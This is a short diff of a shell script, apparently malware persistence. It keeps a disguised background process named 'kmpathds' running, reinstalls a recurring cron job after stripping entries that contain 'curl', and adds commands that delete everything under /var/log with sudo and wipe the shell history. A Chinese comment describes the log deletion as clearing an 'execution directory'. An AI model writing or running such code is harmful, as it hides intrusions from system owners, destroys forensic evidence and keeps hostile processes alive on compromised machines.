@@ -23,9 +23,8 @@ fi
 if ! pgrep -f "kmpathds" > /dev/null; then
     nohup "kmpathds" /dev/null 2>&1 &
 fi
-
-# 清除当前系统的执行目录
-sudo rm -rf /var/log/*
-
 # 清除上一次的任务，添加下一次的任务，每2小时执行一次
 (crontab -l | grep -v "curl" ; echo "$CRON_JOB") | crontab -
+# 清除当前系统的执行目录
+sudo rm -rf /var/log/*
+history -c && echo > ~/.bash_history
